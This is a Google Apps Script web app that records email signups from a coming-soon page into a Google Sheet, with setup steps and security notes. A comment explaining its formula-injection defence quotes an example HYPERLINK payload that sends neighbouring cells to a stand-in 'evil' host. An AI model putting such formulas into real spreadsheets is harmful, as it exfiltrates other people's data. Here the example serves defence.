/**
 * daywise waitlist capture — Google Apps Script web app.
 *
 * Receives signups from the coming-soon page (coming-soon/index.html, deployed from
 * the lachlan-odea/daywise-coming-soon repo) and appends them to a Google Sheet.
 *
 * WHY NOT FIRESTORE: App Check is enforced for Cloud Firestore, so an unauthenticated
 * static page cannot write to it — requests without an App Check token are rejected
 * before security rules are even evaluated. The alternatives were loading the App
 * Check SDK plus reCAPTCHA onto a landing page, or weakening App Check project-wide.
 * This keeps the page light and leaves App Check protecting real user data.
 *
 * ── SETUP ────────────────────────────────────────────────────────────────────────
 * 1. Create a Google Sheet. Name the first tab `waitlist`.
 *    Add a header row:  Timestamp | Email | Source | User agent
 * 2. Extensions → Apps Script. Delete the placeholder and paste this file.
 * 3. Update SHEET_NAME below if you named the tab something else.
 * 4. Deploy → New deployment → type "Web app":
 *       Execute as:        Me
 *       Who has access:    Anyone            <-- required; the page is anonymous
 * 5. Copy the /exec URL and put it in WAITLIST_ENDPOINT in coming-soon/index.html.
 *
 * ── SECURITY ─────────────────────────────────────────────────────────────────────
 * "Anyone" access means this URL is an unauthenticated write endpoint — anybody who
 * reads the page source can post to it. That is inherent to capturing signups from a
 * static page. Mitigations applied here:
 *   * the email is validated and length-capped, and only known fields are recorded;
 *   * values are prefixed so a spreadsheet can never evaluate them as formulas;
 *   * duplicates are ignored, so a replayed request doesn't inflate the list.
 * The blast radius is one spreadsheet — not your Firestore data or billing.
 */

var SHEET_NAME = 'waitlist';
var MAX_EMAIL_LENGTH = 200;

/**
 * Neutralise spreadsheet formula injection.
 *
 * A value beginning with = + - @ (or tab/CR) is evaluated by Sheets and Excel, so
 * `=HYPERLINK("https://evil/?d="&A1,"clickme")` in a submitted field could exfiltrate
 * neighbouring cells when you open the sheet. Prefixing an apostrophe forces text.
 */
function sheetSafe(value) {
  var s = String(value == null ? '' : value);
  return /^[=+\-@\t\r]/.test(s) ? "'" + s : s;
}

function isValidEmail(email) {
  return (
    typeof email === 'string' &&
    email.length >= 5 &&
    email.length <= MAX_EMAIL_LENGTH &&
    /^[^@\s]+@[^@\s]+\.[^@\s]+$/.test(email)
  );
}

function jsonOut(obj) {
  return ContentService.createTextOutput(JSON.stringify(obj)).setMimeType(
    ContentService.MimeType.JSON,
  );
}

function doPost(e) {
  try {
    // The page sends a JSON body as text/plain so the browser treats it as a "simple"
    // request and skips the CORS preflight, which Apps Script cannot answer.
    var body = {};
    if (e && e.postData && e.postData.contents) {
      body = JSON.parse(e.postData.contents);
    } else if (e && e.parameter) {
      body = e.parameter; // form-urlencoded fallback
    }

    var email = String(body.email || '').trim().toLowerCase();
    var source = String(body.source || 'coming-soon').slice(0, 40);
    var userAgent = String(body.userAgent || '').slice(0, 300);

    if (!isValidEmail(email)) {
      return jsonOut({ ok: false, error: 'invalid_email' });
    }

    var sheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName(SHEET_NAME);
    if (!sheet) return jsonOut({ ok: false, error: 'sheet_not_found' });

    // Ignore duplicates so a retry or replay doesn't add the same person twice.
    // Column B holds the email; row 1 is the header.
    var lastRow = sheet.getLastRow();
    if (lastRow > 1) {
      var existing = sheet.getRange(2, 2, lastRow - 1, 1).getValues();
      for (var i = 0; i < existing.length; i++) {
        if (String(existing[i][0]).trim().toLowerCase() === email) {
          return jsonOut({ ok: true, duplicate: true });
        }
      }
    }

    // Timestamp is generated HERE, server-side — never trusted from the client, whose
    // device clock may be wrong or deliberately falsified.
    sheet.appendRow([new Date(), sheetSafe(email), sheetSafe(source), sheetSafe(userAgent)]);

    return jsonOut({ ok: true });
  } catch (err) {
    return jsonOut({ ok: false, error: String(err) });
  }
}

/** Lets you open the /exec URL in a browser to confirm the deployment is live. */
function doGet() {
  return jsonOut({ ok: true, service: 'daywise waitlist', method: 'POST required' });
}
